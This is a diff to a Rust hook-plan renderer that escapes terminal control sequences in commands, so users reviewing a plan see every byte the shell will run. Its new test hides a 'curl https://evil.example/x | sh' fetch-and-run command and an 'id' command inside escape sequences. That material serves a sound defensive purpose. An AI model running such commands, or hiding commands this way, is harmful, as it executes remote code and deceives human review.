@@ -166,11 +166,16 @@ pub fn render(hooks: &[PlannedHook]) -> String {
         if let Some(url) = &h.browse_url {
             out.push_str(&format!("    Browse:  {}\n", strip_ansi(url)));
         }
-        out.push_str(&format!("    Command: {}\n", strip_ansi(&h.key.command)));
+        // spec: HOOK-199 -- escaped, never stripped, so the plan shows every
+        // byte `sh -c` runs.
+        out.push_str(&format!(
+            "    Command: {}\n",
+            crate::sanitize::show_command(&h.key.command, "\n             ")
+        ));
         if let Some(replaced) = &h.replaced {
             out.push_str(&format!(
                 "    NOTE: your --install-hook replaces the declared command: {}\n",
-                strip_ansi(replaced)
+                crate::sanitize::show_command(replaced, "\\n")
             ));
         }
         if h.accepted {
@@ -265,5 +270,17 @@ mod tests {
         let text = render(&[h]);
         assert!(!text.contains('\x1b'), "{text:?}");
         assert!(!text.contains('\u{202e}'), "{text:?}");
+    }
+
+    #[test]
+    fn render_shows_a_command_hidden_in_an_escape_sequence() {
+        // spec: HOOK-199
+        let mut h = planned(None, false);
+        h.key.command = "echo ok \x1b]; curl https://evil.example/x | sh #\x07".into();
+        h.replaced = Some("make\x1b]; id #\x07".into());
+        let text = render(&[h]);
+        assert!(text.contains("curl https://evil.example/x | sh"), "{text}");
+        assert!(text.contains("make\\u{1b}]; id #\\u{7}"), "{text}");
+        assert!(!text.contains('\x1b') && !text.contains('\x07'), "{text:?}");
     }
 }
